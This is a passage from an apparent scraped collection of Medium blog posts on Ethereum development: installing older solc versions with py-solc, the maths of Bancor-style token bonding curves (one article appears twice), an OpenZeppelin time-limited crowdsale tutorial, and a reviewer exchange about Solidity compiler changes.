was installed with. The solcjs package for node has the ability to pull and use older versions of solidity making this relatively easy in Javascript. This functionality is however not present in the solc command line compiler, and installing older versions is not trivial.I\u2019ve used some crude bash scripts to handle installing older versions of the solc compiler in my CI environments for quite a while. While they have served their function well, they are not very extensible or usable for other purposes.In the most recent release of py-solc I\u2019ve refactored these bash scripts to introduce a new experimental feature. The ability to install different versions of solc either from python or your command line using py-solc.>>> from solc import install_solc>>> install_solc('v0.4.12')or, from your command line$ python -m solc.install v0.4.12This functionality is currently only available for the following solidity versions and corresponding operating systems.v0.4.1 \u2014 linuxv0.4.2 \u2014 linuxv0.4.6 \u2014 linuxv0.4.7 \u2014 linuxv0.4.8 \u2014 linux/osxv0.4.9 \u2014 linuxv0.4.11 \u2014 linux/osxv0.4.12 \u2014 linux/osxSo, if you need a specific version of solc either for your local environment or for some automation/testing, I\u2019d recommend giving this feature a spin. You should also feel free to open up an issue if you need a version of solidity that\u2019s not in this list, or even better, open up a pull request adding support for it.", "responses": 0, "tags": ["Ethereum", "Solidity", "Python", "Py Solc"]}, {"title": "Token Bonding Curves", "post_link": "https://medium.com/@aventus/token-bonding-curves-547f3a04914?source=search_post", "author_name": "Aventus Network", "author_link": "https://medium.com/@aventus", "publish_date": "2018-11-13", "last_modified_date": "2018-11-13", "readtime": "13.3", "claps": 63, "voters": 5, "content": "Token Bonding CurvesAventus NetworkFollowNov 13, 2018 \u00b7 14 min readToday\u2019s post comes from Alex Pinto, our great team asset, whose previous 2 articles, \u201cWorking with Strings in Solidity\u201d and \u201cArrays in Solidity\u201d were very welcomed by the blockchain community.There is a relatively new concept doing the rounds around the blockchain community, that of Token Bonding Curves. Although it has been around since 2017, for example in posts about Curated Markets written by Simon de la Rouviere, it seems to have picked up steam in 2018 as an alternative to ICOs.In this post, I want to explore a bit of the maths behind these curves, in particular the Bancor\u2019s implementation.The main use I have seen of Token-Bonding Curves, and the one I have been mostly looking at, is to serve as a sort of automatic market-maker to a token. This is, users can send requests to a smart contract to buy or sell tokens of a given type (the main token) in exchange for tokens of another type. In Bancor\u2019s parlance, this is the connector token. I don\u2019t like this name and prefer to call it reserve token.I have mentioned Bancor twice already, so it is fair that I tell you more about them.Bancor can be an adjective qualifying a Network, a Protocol, a Token and a Formula. At least. All of these are, of course, related. The core is the protocol, that specifies the concept of Smart Token. This is a smart contract that encapsulates the concept of a token which is connected to other tokens and can be traded for them. The Bancor protocol specifies a way this exchange can happen, and how the price of the Smart Token varies when it is bought or sold. The Bancor Formula(s) specifies(y) how this price changes, and how much each transaction costs (either in the units of the main token, or the connected token). A Smart Token can be connected to more than one other token, and in that case, it is possible to exchange between the connected tokens instead, using the main token only as an exchange vehicle. In this sense, a Smart Token is very much an alternative to exchanges with several advantages, of which I highlight:No need to register with an exchange, which normally requires providing them with highly sensitive data.The above also means that the tokens and the personal data are not stored in a kind of third party that has historically been a high-value target for hackers.Increased liquidity for the main token, since the market is always available and is independent of matching supply and demand.Faster trades, since the swap of tokens is done immediately by the contract.The Bancor Network is made of all the Smart Tokens deployed and interconnected, as well as the users that access it. The Bancor Network Token (BNT) is a Smart Token that has connectors to all other tokens in the network, and accordingly functions as the hub enabling trade among all token pairs.The reason I bring Bancor to the fore is because it was the first implementation of TBC I found and the only one I have looked at in any depth. I am not advocating their use. And in this post I will look only at the most basic usage of the Bancor TBC, with only one connector token and only the sell/buy functionality.Basic ConceptsBefore I go any deeper into the maths, it is useful to make some concepts and terminology clear regarding these curves. There are a few important quantities:Price: the price of a single tokenSupply: how many tokens have been issued by the market, and not redeemed, burned or destroyed (these are all synonym terms for tokens that are sold back to the market)Reserve: how much value the market received for the tokens it has supplied to the market (ie tokens sold minus tokens bought back)Market capitalisation: the theoretical value of the tokens issued by the market, if all of them could be sold at the current price.Reserve ratio: the ratio between the Reserve and the Market capitalisation (also known as \u201cMarket Cap\u201d).But what is the curve in \u201cToken-Bonding Curves\u201d, I hear you ask?Remember that I talked about a market-maker above? A market maker provides a market that is always available to traders, in both directions, but at a price that is constantly varying. In a TBC, this is usually a function of a single variable (usually the token supply), and such functions are generically known as curves. The actual TBC is this price function, but in metonymical fashion it has come to signify the whole market built around it.Note: So far, all the uses I have seen make the price depend solely on the supply. In theory, this could be defined on other variables (for example time). It\u2019s not even impossible to make the price depend on more than one variable at the same time, transforming a Token-Bonding Curve in something like a Token-Bonding surface, but the resulting maths would be much more complicated.The price function can, in theory, have any form, as long as it is continuous. In reality, it will not be chosen on a whim, but rather with the intention of favouring a certain market behaviour, and promoting certain economic incentives. Which those are will depend on the business case of the market creator.Most often than not, the intention is to reward early adopters, ensuring that the price will increase with the number of tokens sold by the market: early buyers will have cheaper prices, while those that come after will pay more. This, however, will depend on the liquidity of the market. If there is a frequent two-way movement, with frequent sales as well as purchases, the price may go down with time, as more people sell their tokens, only for it to pick up later again when the price falls below some kind of equilibrium.Buying and selling tokensImagine that you want to buy a token from a TBC, and that the price function is P(S) = S / 100. If the supply is currently of 100 tokens, the price of the next full token that the curve sells will be P(100 + 1) = 1.01.After 10 tokens are bought, the price of the next full token will rise to 1.1. If we wanted to buy 10 tokens when the supply was at 100, we\u2019d pay 1.01 + ... + 1.10 = 10.55, for an average cost of 1.055, more or less halfway between the token price at the start and the end of our purchase.This simple example assumes that we can only buy whole tokens, but that generally is not the case. Users are able to buy fractions of a token, and when doing so the token price will update accordingly. In the example above, if i decided to buy only 1/10th of a token the price of the first fraction would change from 1.01 to P(100 + 0.1)/10 = 0.1001. Then, for the next fraction I\u2019d pay P(100.1 + 0.2)/10 = 0.1002, and so on until I had bought the whole first token. My total would be 0.1001 + 0.1002 + ... + 0.101 = 1.0055, which is less than the original price of 1.01. The same applies if I want to buy the next 9 tokens, bringing the total to 10.505 instead of 10.55. So, we can save money by buying smaller fractions. How small can we buy them? How do we compute the cost of buying from point A to point B in the curve?Computing the CostImagine that the user buys tokens in the smallest possible fraction.If the smallest unit we can buy is 0.001, then one unit will extend from 99.999 to 100.000, at price 1, the next will go from 100.000 to 100.001, at price 1.00001, and so on. If you draw a horizontal line for the price inside these intervals, you will have a succession of rectangles just above the price curve. The area of each rectangle represents the cost of buying each unit. If instead we paid the price of the current token (if the supply is currently 100, then you would pay 1), then we\u2019d get rectangles under the curve, and the finer these rectangles are, the closer to the curve they would be (and the higher the cost would be). Both sets of rectangles are just approximations that follow from having some finite precision. But mathematical theory gives us the tools to consider infinite precision, when the rectangles are infinitesimally thin. In this case, the sum of their areas is exactly the area below the curve, and that quantity is given by the Integral function.It is also the reserve of the curve at that point, since it corresponds to the total value paid to reach the current supply. That gives us a fast way to compute the cost of any trade: compute the reserve function for the supply before you trade (buy or sell) and for the supply after you trade. You pay, or receive, the difference between these two values, if the market is using the same curve for buying and selling.The market could indeed be using different curves, which is equivalent to defining a spread. Although this is common in financial markets, it is beyond the scope of this post, so I\u2019ll ignore that today.The Bancor FormulaBancor has defined a hard requirement: to maintain at all times a constant reserve ratio. It is not clear to me why they do this. As I will show below, this restricts the price functions that we can use. The function is simple and easy to understand.The definition of reserve ratio, in mathematical terms, is this:Reserve Ratio (RR) = Reserve (R) / (Supply (S) x Price (P))And we are guaranteed that this ratio is constant, no matter where we are on the curve.(From now on, I\u2019ll use only the abbreviations to simplify.)Using the above, we can compute the price of the next token by applying this formula:P = R / (RR x S)What sort of function is this? How does the price change with the supply? And how easy are these to integrate, for us to find the price of a trade?The answer to this requires a bit of Calculus. I leave it here for those who are interested in maths, but feel free to skip it if you\u2019d rather just take my word for it.I\u2019ll show you first some intuitive cases.Constant PriceIn this case, the price is always the same, and does not change with the supply. I have listed one sample point, A, at coordinates (10,10). The market cap at this point is the total supply multiplied by the price: 100. In fact, the Market Cap at one point is always defined by the rectangle whose base is the supply and the height is the price.But the space below the curve is the exact same rectangle, given that the price is a horizontal line. Therefore, the reserve ratio must be 1, and whenever the reserve ratio is 1, the price must be a constant function.Linear PriceIn this case, we have a linear price function. For each unit that the supply increases, the price increases by two. The slope of the curve looks more or less 45\u00ba here, but that is because the axes have been scaled to different factors. The point I\u2019m going to make is valid for any slope between 0\u00ba and 90\u00ba degrees: the area below the curve, at any point, is always a right triangle and corresponds to exactly a half of the market cap at that point. This means the reserve ratio is 1/2.The converse is also true. If the ratio is 1/2 anywhere we must always have a linear function, but I will leave the proof for the next section.General caseBancor does not allow reserve ratios equal to 0. That would mean the market would never have any money to pay sellers of tokens. It also does not allow reserve ratios greater than 1. That would mean that at some point the price curve would be decreasing, and you could lose money if you sold when the supply was higher than when you bought. This is important because it limits the values we have to analyse later.So I will now show you how we can deduce the types of functions we can have.Let\u2019s define some variables:s represents the supply, and is the variable of the horizontal axisp(s) represents the price for a given supply, and is plotted on the vertical axis.k is the reserve ratioThe market capitalisation is, at each point:and the reserve is given byBecause the reserve ratio is constant, the following holds for any value of s:where P(s) is the primitive (i.e., the indefinite integral) of p(s).By derivation of both sides, we get:The above is a differential equation, and in general it is not always possible to solve these analytically. We are lucky, though, because this belongs to a class that can be easily solved. Here\u2019s how to proceed.In the above equation, the terms P(s), P(0) are of different types. 0 is a constant, and so P(0) is a function with all its variables defined. Therefore, it is also a constant, and its derivative is 0. P(s), on the other hand, is a function with the free variable s, the same we have on the other side of the equation. This means its derivative is also a function of s and not a constant. But because P(s) is the primitive of p(s), by definition P\u2019(s) = p(s).Now, applying the rule for derivatives of multiplication on the left hand side we get:The next step involves a little creativity, necessary to recognise that on both sides of the equation we have well known derivatives:This allows us to get rid of the derivatives by integrating again:To finally solve this equation and find p(s), we have only to exponentiate both sides:This is the payoff, the final general expression of all the price functions accepted by Bancor.Curve shapesThe above equation shows that a Bancor curve is completely defined by two parameters: the reserve ratio and some constant. This constant is customary when solving differential equations, and is usually defined by inputting some initial variables to the system. In the case of Bancor, that would be a legal pair in the curve, for example, \u201cprevious balance and reserve\u201d.The second parameter is the reserve ratio, and I find it more interesting because it sets the shape of the curve, and thereby the kind of incentives we want to promote.Remember 0 <k\u22641Following are some figures showing what these curves look like.The first image shows three polynomial price functions, with differing exponent:All of these have a similar shape, and that is true of higher degree polynomials with a single term as well. The higher the exponent is, the higher the prices are in general, and the more concave the curve is, with a U-shape that becomes narrower as the exponent increases. The lower it is, the closer it is to a simple line.This picture illustrates the exact same functions, but in the range between 0 and 1. In this interval, the behaviour of the lines is similar: lower exponents closer to a line; higher exponents more curved. But that has the effect that the lower the exponent is, the higher the price is. Lower exponents offer a smoother travel, with lower highs, but also higher lows.The image above demonstrates three price functions, whose exponent is less than 1. The functions here are:These functions look a bit like a U-shape turned on its side, with a quick rise near the origin of the chart, then a gradual approximation to a horizontal line. Still, just like the polynomial functions with exponents larger than 1, these functions never have an asymptote and will not converge to any fixed straight line (horizontal or sloped).Also, like the examples above, these functions have distinct behaviour on the different sides of x=1. To the left of this line, smaller exponents rise at a quicker rate than higher exponents, but they are overtaken on the right side of this line by the higher exponents, growing much slower.Finally, in this last picture, I show two functions with the same degree, but a different constant.They have the exact same shape, but grow at different rates because of the constant. But the point I want you to notice is that, just as predicted by the formula, the area below each curve is still exactly 1/3 of the rectangle defined by the last point of the curve. This is an empirical demonstration of how the reserve ratio depends only on the exponent of the price function, and not on the other parameter of the curve.That is it for today. Thank you for reading, and I hope you\u2019ll be back another time.About the AuthorAlex is a software engineer at Aventus, working on the blockchain engineering team. He has 20 years of experience working in technology, completing a PhD in Computer Science as well as a post-doctorate in Cryptography. As part of his research, Alex has published papers on Kolmogorov Complexity, Cryptography, Database Anonymization and Code Obfuscation.Alex also spent seven years lecturing at the University Institute of Maia, including directing the degree programmes for BSc Computer Science and Information Systems and Software.This article was originally posted on his blog.", "responses": 0, "tags": ["Blockchain", "Token Bonding Curves", "Cryptography", "Maths", "Cryptocurrency"]}, {"title": "Token Bonding Curves", "post_link": "https://blog.aventus.io/token-bonding-curves-683b8b309c18?source=search_post", "author_name": "Aventus Network", "author_link": "https://blog.aventus.io/@aventus", "publish_date": "2018-11-09", "last_modified_date": "2018-11-09", "readtime": "13.3", "claps": 84, "voters": 6, "content": "Token Bonding CurvesAventus NetworkFollowNov 9, 2018 \u00b7 14 min readToday\u2019s post comes from Alex Pinto, our great team asset, whose previous 2 articles, \u201cWorking with Strings in Solidity\u201d and \u201cArrays in Solidity\u201d were very welcomed by the blockchain community.There is a relatively new concept doing the rounds around the blockchain community, that of Token Bonding Curves. Although it has been around since 2017, for example in posts about Curated Markets written by Simon de la Rouviere, it seems to have picked up steam in 2018 as an alternative to ICOs.In this post, I want to explore a bit of the maths behind these curves, in particular the Bancor\u2019s implementation.The main use I have seen of Token-Bonding Curves, and the one I have been mostly looking at, is to serve as a sort of automatic market-maker to a token. This is, users can send requests to a smart contract to buy or sell tokens of a given type (the main token) in exchange for tokens of another type. In Bancor\u2019s parlance, this is the connector token. I don\u2019t like this name and prefer to call it reserve token.I have mentioned Bancor twice already, so it is fair that I tell you more about them.Bancor can be an adjective qualifying a Network, a Protocol, a Token and a Formula. At least. All of these are, of course, related. The core is the protocol, that specifies the concept of Smart Token. This is a smart contract that encapsulates the concept of a token which is connected to other tokens and can be traded for them. The Bancor protocol specifies a way this exchange can happen, and how the price of the Smart Token varies when it is bought or sold. The Bancor Formula(s) specifies(y) how this price changes, and how much each transaction costs (either in the units of the main token, or the connected token). A Smart Token can be connected to more than one other token, and in that case, it is possible to exchange between the connected tokens instead, using the main token only as an exchange vehicle. In this sense, a Smart Token is very much an alternative to exchanges with several advantages, of which I highlight:No need to register with an exchange, which normally requires providing them with highly sensitive data.The above also means that the tokens and the personal data are not stored in a kind of third party that has historically been a high-value target for hackers.Increased liquidity for the main token, since the market is always available and is independent of matching supply and demand.Faster trades, since the swap of tokens is done immediately by the contract.The Bancor Network is made of all the Smart Tokens deployed and interconnected, as well as the users that access it. The Bancor Network Token (BNT) is a Smart Token that has connectors to all other tokens in the network, and accordingly functions as the hub enabling trade among all token pairs.The reason I bring Bancor to the fore is because it was the first implementation of TBC I found and the only one I have looked at in any depth. I am not advocating their use. And in this post I will look only at the most basic usage of the Bancor TBC, with only one connector token and only the sell/buy functionality.Basic ConceptsBefore I go any deeper into the maths, it is useful to make some concepts and terminology clear regarding these curves. There are a few important quantities:Price: the price of a single tokenSupply: how many tokens have been issued by the market, and not redeemed, burned or destroyed (these are all synonym terms for tokens that are sold back to the market)Reserve: how much value the market received for the tokens it has supplied to the market (ie tokens sold minus tokens bought back)Market capitalisation: the theoretical value of the tokens issued by the market, if all of them could be sold at the current price.Reserve ratio: the ratio between the Reserve and the Market capitalisation (also known as \u201cMarket Cap\u201d).But what is the curve in \u201cToken-Bonding Curves\u201d, I hear you ask?Remember that I talked about a market-maker above? A market maker provides a market that is always available to traders, in both directions, but at a price that is constantly varying. In a TBC, this is usually a function of a single variable (usually the token supply), and such functions are generically known as curves. The actual TBC is this price function, but in metonymical fashion it has come to signify the whole market built around it.Note: So far, all the uses I have seen make the price depend solely on the supply. In theory, this could be defined on other variables (for example time). It\u2019s not even impossible to make the price depend on more than one variable at the same time, transforming a Token-Bonding Curve in something like a Token-Bonding surface, but the resulting maths would be much more complicated.The price function can, in theory, have any form, as long as it is continuous. In reality, it will not be chosen on a whim, but rather with the intention of favouring a certain market behaviour, and promoting certain economic incentives. Which those are will depend on the business case of the market creator.Most often than not, the intention is to reward early adopters, ensuring that the price will increase with the number of tokens sold by the market: early buyers will have cheaper prices, while those that come after will pay more. This, however, will depend on the liquidity of the market. If there is a frequent two-way movement, with frequent sales as well as purchases, the price may go down with time, as more people sell their tokens, only for it to pick up later again when the price falls below some kind of equilibrium.Buying and selling tokensImagine that you want to buy a token from a TBC, and that the price function is P(S) = S / 100. If the supply is currently of 100 tokens, the price of the next full token that the curve sells will be P(100 + 1) = 1.01.After 10 tokens are bought, the price of the next full token will rise to 1.1. If we wanted to buy 10 tokens when the supply was at 100, we\u2019d pay 1.01 + ... + 1.10 = 10.55, for an average cost of 1.055, more or less halfway between the token price at the start and the end of our purchase.This simple example assumes that we can only buy whole tokens, but that generally is not the case. Users are able to buy fractions of a token, and when doing so the token price will update accordingly. In the example above, if i decided to buy only 1/10th of a token the price of the first fraction would change from 1.01 to P(100 + 0.1)/10 = 0.1001. Then, for the next fraction I\u2019d pay P(100.1 + 0.2)/10 = 0.1002, and so on until I had bought the whole first token. My total would be 0.1001 + 0.1002 + ... + 0.101 = 1.0055, which is less than the original price of 1.01. The same applies if I want to buy the next 9 tokens, bringing the total to 10.505 instead of 10.55. So, we can save money by buying smaller fractions. How small can we buy them? How do we compute the cost of buying from point A to point B in the curve?Computing the CostImagine that the user buys tokens in the smallest possible fraction.If the smallest unit we can buy is 0.001, then one unit will extend from 99.999 to 100.000, at price 1, the next will go from 100.000 to 100.001, at price 1.00001, and so on. If you draw a horizontal line for the price inside these intervals, you will have a succession of rectangles just above the price curve. The area of each rectangle represents the cost of buying each unit. If instead we paid the price of the current token (if the supply is currently 100, then you would pay 1), then we\u2019d get rectangles under the curve, and the finer these rectangles are, the closer to the curve they would be (and the higher the cost would be). Both sets of rectangles are just approximations that follow from having some finite precision. But mathematical theory gives us the tools to consider infinite precision, when the rectangles are infinitesimally thin. In this case, the sum of their areas is exactly the area below the curve, and that quantity is given by the Integral function.It is also the reserve of the curve at that point, since it corresponds to the total value paid to reach the current supply. That gives us a fast way to compute the cost of any trade: compute the reserve function for the supply before you trade (buy or sell) and for the supply after you trade. You pay, or receive, the difference between these two values, if the market is using the same curve for buying and selling.The market could indeed be using different curves, which is equivalent to defining a spread. Although this is common in financial markets, it is beyond the scope of this post, so I\u2019ll ignore that today.The Bancor FormulaBancor has defined a hard requirement: to maintain at all times a constant reserve ratio. It is not clear to me why they do this. As I will show below, this restricts the price functions that we can use. The function is simple and easy to understand.The definition of reserve ratio, in mathematical terms, is this:Reserve Ratio (RR) = Reserve (R) / (Supply (S) x Price (P))And we are guaranteed that this ratio is constant, no matter where we are on the curve.(From now on, I\u2019ll use only the abbreviations to simplify.)Using the above, we can compute the price of the next token by applying this formula:P = R / (RR x S)What sort of function is this? How does the price change with the supply? And how easy are these to integrate, for us to find the price of a trade?The answer to this requires a bit of Calculus. I leave it here for those who are interested in maths, but feel free to skip it if you\u2019d rather just take my word for it.I\u2019ll show you first some intuitive cases.Constant PriceIn this case, the price is always the same, and does not change with the supply. I have listed one sample point, A, at coordinates (10,10). The market cap at this point is the total supply multiplied by the price: 100. In fact, the Market Cap at one point is always defined by the rectangle whose base is the supply and the height is the price.But the space below the curve is the exact same rectangle, given that the price is a horizontal line. Therefore, the reserve ratio must be 1, and whenever the reserve ratio is 1, the price must be a constant function.Linear PriceIn this case, we have a linear price function. For each unit that the supply increases, the price increases by two. The slope of the curve looks more or less 45\u00ba here, but that is because the axes have been scaled to different factors. The point I\u2019m going to make is valid for any slope between 0\u00ba and 90\u00ba degrees: the area below the curve, at any point, is always a right triangle and corresponds to exactly a half of the market cap at that point. This means the reserve ratio is 1/2.The converse is also true. If the ratio is 1/2 anywhere we must always have a linear function, but I will leave the proof for the next section.General caseBancor does not allow reserve ratios equal to 0. That would mean the market would never have any money to pay sellers of tokens. It also does not allow reserve ratios greater than 1. That would mean that at some point the price curve would be decreasing, and you could lose money if you sold when the supply was higher than when you bought. This is important because it limits the values we have to analyse later.So I will now show you how we can deduce the types of functions we can have.Let\u2019s define some variables:s represents the supply, and is the variable of the horizontal axisp(s) represents the price for a given supply, and is plotted on the vertical axis.k is the reserve ratioThe market capitalisation is, at each point:and the reserve is given byBecause the reserve ratio is constant, the following holds for any value of s:where P(s) is the primitive (i.e., the indefinite integral) of p(s).By derivation of both sides, we get:The above is a differential equation, and in general it is not always possible to solve these analytically. We are lucky, though, because this belongs to a class that can be easily solved. Here\u2019s how to proceed.In the above equation, the terms P(s), P(0) are of different types. 0 is a constant, and so P(0) is a function with all its variables defined. Therefore, it is also a constant, and its derivative is 0. P(s), on the other hand, is a function with the free variable s, the same we have on the other side of the equation. This means its derivative is also a function of s and not a constant. But because P(s) is the primitive of p(s), by definition P\u2019(s) = p(s).Now, applying the rule for derivatives of multiplication on the left hand side we get:The next step involves a little creativity, necessary to recognise that on both sides of the equation we have well known derivatives:This allows us to get rid of the derivatives by integrating again:To finally solve this equation and find p(s), we have only to exponentiate both sides:This is the payoff, the final general expression of all the price functions accepted by Bancor.Curve shapesThe above equation shows that a Bancor curve is completely defined by two parameters: the reserve ratio and some constant. This constant is customary when solving differential equations, and is usually defined by inputting some initial variables to the system. In the case of Bancor, that would be a legal pair in the curve, for example, \u201cprevious balance and reserve\u201d.The second parameter is the reserve ratio, and I find it more interesting because it sets the shape of the curve, and thereby the kind of incentives we want to promote.Remember 0 <k\u22641Following are some figures showing what these curves look like.The first image shows three polynomial price functions, with differing exponent:All of these have a similar shape, and that is true of higher degree polynomials with a single term as well. The higher the exponent is, the higher the prices are in general, and the more concave the curve is, with a U-shape that becomes narrower as the exponent increases. The lower it is, the closer it is to a simple line.This picture illustrates the exact same functions, but in the range between 0 and 1. In this interval, the behaviour of the lines is similar: lower exponents closer to a line; higher exponents more curved. But that has the effect that the lower the exponent is, the higher the price is. Lower exponents offer a smoother travel, with lower highs, but also higher lows.The image above demonstrates three price functions, whose exponent is less than 1. The functions here are:These functions look a bit like a U-shape turned on its side, with a quick rise near the origin of the chart, then a gradual approximation to a horizontal line. Still, just like the polynomial functions with exponents larger than 1, these functions never have an asymptote and will not converge to any fixed straight line (horizontal or sloped).Also, like the examples above, these functions have distinct behaviour on the different sides of x=1. To the left of this line, smaller exponents rise at a quicker rate than higher exponents, but they are overtaken on the right side of this line by the higher exponents, growing much slower.Finally, in this last picture, I show two functions with the same degree, but a different constant.They have the exact same shape, but grow at different rates because of the constant. But the point I want you to notice is that, just as predicted by the formula, the area below each curve is still exactly 1/3 of the rectangle defined by the last point of the curve. This is an empirical demonstration of how the reserve ratio depends only on the exponent of the price function, and not on the other parameter of the curve.That is it for today. Thank you for reading, and I hope you\u2019ll be back another time.About the AuthorAlex is a software engineer at Aventus, working on the blockchain engineering team. He has 20 years of experience working in technology, completing a PhD in Computer Science as well as a post-doctorate in Cryptography. As part of his research, Alex has published papers on Kolmogorov Complexity, Cryptography, Database Anonymization and Code Obfuscation.Alex also spent seven years lecturing at the University Institute of Maia, including directing the degree programmes for BSc Computer Science and Information Systems and Software.This article was originally posted on his blog.", "responses": 0, "tags": ["Token Bonding Curve", "Blockchain", "Aventus", "Ethereum", "Bancor"]}, {"title": "How To Create A Basic Time-Sensitive Crowdsale Token With OpenZeppelin Library", "post_link": "https://medium.com/crowdbotics/how-to-create-a-time-sensitive-crowdsale-token-using-openzeppelin-library-8d6b679d94ef?source=search_post", "author_name": "Gaurav Agrawal", "author_link": "https://medium.com/@gaurav.agrawal", "publish_date": "2018-10-23", "last_modified_date": "2019-06-12", "readtime": "2.05", "claps": 35, "voters": 4, "content": "How To Create A Basic Time-Sensitive Crowdsale Token With OpenZeppelin LibraryAdd an opening time and closing time for a crowdsale token using OpenZeppelin LibraryGaurav AgrawalFollowOct 23, 2018 \u00b7 3 min readRecap: In the last tutorial series, we created a capped crowdsale using OpenZeppelin library, limiting an investor\u2019s maximum and minimum investment. In this tutorial, we will extend that concept and make our contract time sensitive as well.Today, we will add opening time and closing time for our crowdsale with open zeppelin library. We will continue building upon our ExampleTokenCrowdsale.sol contract.Benefits of time-sensitive crowdsalePlanning marketing strategiesCommunication with investorsMore focused approach because of time limitationIdea validation to pursue the project or notTime-sensitive ExampleTokenCrowdsale.sol :Example token CrowdsaleOpen-zeppelin library provides TimeCrowdsale.sol which gives us basic functionality to create time-sensitive crowdsale.So, let\u2019s take a look:pragma solidity ^0.4.23;import \"../../math/SafeMath.sol\";import \"../Crowdsale.sol\";contract TimedCrowdsale is Crowdsale {  using SafeMath for uint256;uint256 public openingTime;  uint256 public closingTime;modifier onlyWhileOpen {    require(block.timestamp >= openingTime && block.timestamp <= closingTime);    _;  }constructor(uint256 _openingTime, uint256 _closingTime) public {    require(_openingTime >= block.timestamp);    require(_closingTime >= _openingTime);openingTime = _openingTime;    closingTime = _closingTime;  }function hasClosed() public view returns (bool) {    return block.timestamp > closingTime;  }function _preValidatePurchase(    address _beneficiary,    uint256 _weiAmount  )    internal    onlyWhileOpen  {    super._preValidatePurchase(_beneficiary, _weiAmount);  }}As you can see TimeCrowdsale constructor takes two parameters _openingTime and _closingTime. We will use this constructor in our ExampleTokenCrowdsale.sol to define opening time and closing time for our crowdsale.This contract uses block.timerstamp which is the timestamp of current block since epoch. This time is used in comparing the opening time and closing time for the crowdsale.It also has a _preValidatePurchase method which you can extend in your crowdsale implementation to add some specific time conditions.Now let\u2019s see how we use this contract in our ExampleTokenCrowdsale.sol constructor.constructor(uint256 _rate,   address _wallet,   ERC20 _token,   uint256 _cap,   uint256 _openingTime,   uint256 _closingTime) Crowdsale(_rate, _wallet, _token) CappedCrowdsale(_cap)  TimedCrowdsale(_openingTime, _closingTime) public{ }As you can see, we are using TimeCrowdsale in our ExampleTokenCrowdsale constructor and passing _openingTime and _closingTime.Now we can pass opening time and closing time while deploying our contracts. As mentioned in previous tutorials, open-zeppelin library is well tested and we don\u2019t need to test the functionality given by the library.But you can write some basic tests and check that everything worked fine. If you need a reference, you can check test cases which I have written while building these tokens.If you have any doubt regarding above, Let us know in comment sections.Starting a new blockchain project, or looking for a Solidity developer?Crowdbotics helps business build cool things with Solidity (among other things). If you have a blockchain project where you need additional developer resources, drop us a line. Crowbotics can help you estimate build time for given product and feature specs, and provide specialized Solidity developers as you need them. If you\u2019re building with Solidity, check out Crowdbotics.", "responses": 0, "tags": ["Ethereum", "Tutorial", "Solidity", "Programming", "Openzeppelin"]}, {"title": "", "post_link": "https://medium.com/@tuurdemeester/hi-pelle-you-indeed-disagreed-with-this-claim-in-your-review-af7c7a308a87?source=search_post", "author_name": "Tuur Demeester", "author_link": "https://medium.com/@tuurdemeester", "publish_date": "2016-10-06", "last_modified_date": "2018-06-11", "readtime": "1.87", "claps": 7, "voters": 7, "content": "As I mentioned when I was reviewing the article, this is plainly false.841Pelle BraendgaardTuur DemeesterFollowOct 6, 2016 \u00b7 2 min readHi Pelle, you indeed disagreed with this claim in your review. Another reviewer disagreed with your argument, which I then forwarded to you. This was yesterday, the day before I had planned to put out the article. Possibly I should have taken more time to study both sides of the argument (and postponed publication), but when I read both sides yesterday, the other reviewers\u2019 point struck me as more likely to be accurate. For completeness let me reproduce the main parts of the feedback here below:Your main counterargument (correct me if I needed to quote a larger part): \u201cBy the way upgrading solidity will not affect existing contracts at all. I\u2019m not sure who came up with that. You may need to upgrade existing source code to make it compatible with future versions, but existing contracts on the blockchain are immutable and will never be affected. (\u2026) Basically solidity is a compiled language, so after deployment it is really no longer important. Solidit 0.4 introduces some very good features to make it harder for naive developers to write insecure code. This breaks compilation of old solidity code, but in no way affects interaction with older deployed code.\u201dThe other reviewer\u2019s response: \u201c\u2026those criticisms are clearly wrong; if you have a bunch of code written in the language, and the compiler changes the behavior on you, sure, you\u2019re going to get different bytecode and different results in the compiled version. The comment from the transcript, in this context, appears to be about maintenance of the code written in the solidity language. Your response should be \u2014 while it might be the case that some contracts are compiled only once, there are others that are probably compiled multiple times. Source code is still important even after deployment because users are going to reuse it. If ethereum people are arguing that solidity is merely a translation layer to create contract code once \u2014 \u201cwrite and forget\u201d \u2014 then that\u2019s a very interesting claim that deserves elaboration in its own right.\u201dYour response to that argument (in your message to me):\u201cwhat this just means is that it\u2019s a very young ecosystem. All of these things are improving. See the Changelog for why these changes were made, but also note that they have now included a pragma statement to avoid such issues in the future. https://github.com/ethereum/solidity/blob/develop/Changelog.md#040-2016-09-0808 \u2026. These are things that typically happen in any language early on, while they are defining core features. There are several things that are still needed for making solidity a mature development environment but we\u2019re getting there. There still isn\u2019t a decent package manager, but then again it took 15 years for JS to get one and 10 years for Ruby. But great tools are appearing such as http://truffleframework.com which introduces proper testing frameworks as well as migration tools for updating code. Also remember none of these things have anything directly to do with Ethereum or the EVM, it\u2019s just Solidity.\u201d", "responses": 4, "tags": []}, {"title": "More price functions for Token-Bonding Curves", "post_link": "https://medium.com/hackernoon/more-price-functions-for-token-bonding-curves-d42b325ca14b?source=search_post", "author_name": "Aventus Network", "author_link": "https://medium.com/@aventus", "publish_date": "2018-11-15", "last_modified_date": "2018-11-15", "readtime": "11.2", "claps": 90, "voters": 5, "content": "More price functions for Token-Bonding CurvesAventus NetworkFollowNov 15, 2018 \u00b7 12 min readFollowing last week\u2019s article, written by Alexandre Pinto, the author of Arrays in Solidity and Working with Strings in Solidity, today we continue talking about the Token Bonding Curves.In my previous post about Token-Bonding Curves, I showed that Bancor only allows 4 different types of curves. But that does not have to be the whole story, if we allow the reserve ratio to fluctuate. Today, I examine some variants that don\u2019t fit in that scheme.Positive Initial priceI start with simple variants of the Bancor\u2019s curves. The Bancor price curves can all be represented by a function of formwhere k can be any real value and C \u22600.This function always goes through the origin of the graph, that is, the price of a token at supply 0 is also 0.An easy change is to make this a positive price:The above graph shows one such curve,where a standard curve has been pushed up from the x-axis by 6 units. It is still easy to integrate:We can use this to compute the reserve for the two points market in the graph:The corresponding market caps are 108 and 27. It is easy to conclude the reserve ratio is not constant. One way to look at this is that we have an extra rectangle added to an area with a constant reserve ratio. As the supply grows, the relative importance of the lower rectangle\u2019s area diminishes as the area of the rest of the curve increases. That means the reserve ratio is very high for low supplies, but will decrease as the supply grows.There is a lower limit for this ratio, and we can deduce it intuitively. Fix a point X that we want to compute this ratio for, and let the price curve beThere are two parts to the area under the curve: one is the area under the horizontal that represents the initial price (area A); the other is the area between this horizontal and the curve (area B). The market cap, on its turn, includes area A again, and everything between this and the horizontal line that passes through X. If area A were 0, (ie the initial price would be 0) then the reserve ratio would be k. When it is not, area A contributes both to the reserve and the market cap, and so the reserve ratio can only 